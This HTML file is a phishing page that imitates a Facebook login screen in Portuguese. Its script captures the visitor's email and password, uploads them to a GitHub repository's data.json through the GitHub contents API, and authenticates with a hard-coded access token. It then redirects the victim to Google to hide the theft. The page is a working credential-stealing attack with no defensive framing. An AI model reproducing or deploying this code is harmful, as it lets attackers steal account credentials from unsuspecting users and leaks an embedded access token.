<!DOCTYPE htm
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login - Facebook</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f0f2f5;
    }

    .login-container {
      width: 360px;
    }

    .login-box {
      background-color: #fff;
      padding: 20px;
      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.3);
      text-align: center;
    }

    img {
      width: 120px;
      margin-bottom: 20px;
    }

    h2 {
      margin-bottom: 20px;
    }

    form {
      display: flex;
      flex-direction: column;
    }

    label {
      margin-top: 10px;
    }

    input {
      padding: 10px;
      margin: 5px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    button {
      background-color: #1877f2;
      color: #fff;
      padding: 10px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      margin-top: 10px;
    }

    button:hover {
      background-color: #0e63ac;
    }

    .separator {
      margin: 20px 0;
      position: relative;
    }

    .separator:before, .separator:after {
      content: "";
      position: absolute;
      top: 50%;
      width: 50%;
      height: 1px;
      background-color: #ddd;
    }

    .separator:before {
      right: 100%;
      margin-right: 15px;
    }

    .separator:after {
      left: 100%;
      margin-left: 15px;
    }

    a {
      color: #1877f2;
      text-decoration: none;
      margin-top: 10px;
    }

    a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="login-box">
      <img src="facebook-logo.png" alt="Facebook Logo">
      <h2>Entrar no Facebook</h2>
      <!-- Alteração no atributo action e método de envio do formulário -->
      <form id="login-form">
        <label for="email">Email ou Senha:</label>
        <input type="text" id="email" name="email" required>
        <label for="password">Senha:</label>
        <input type="password" id="password" name="password" required>
        <button type="submit">Entrar</button>
        <div class="separator">
          <span>ou</span>
        </div>
        <a href="#">Criar nova Conta?</a>
        <a href="#">Esqueceu a Senha?</a>
      </form>
    </div>
  </div>

  <!-- Script para enviar os dados do formulário para o GitHub -->
  <script>
    document.getElementById("login-form").addEventListener("submit", function(event) {
      event.preventDefault();
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;
      const githubToken = "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"; // Substitua "SEU_TOKEN_AQUI" pelo seu token de acesso pessoal

      const data = {
        "logins": [
          {
            "email": email,
            "password": password
          }
        ]
      };

      fetch("https://api.github.com/repos/romariogitrep/sitelogin/contents/data.json", {
        method: "PUT",
        headers: {
          "Authorization": "token " + githubToken,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          message: "Atualizar data.json",
          content: btoa(JSON.stringify(data)),
        }),
      })
      .then(response => response.json())
      .then(data => {
        console.log("Dados salvos com sucesso!");
        console.log(data);
        // Aqui você pode redirecionar o usuário para outra página, se desejar
        window.location.href = "https://www.google.com.br";
      })
      .catch(error => {
        console.error("Erro ao salvar os dados:", error);
      });
    });
  </script>
</body>
</html>
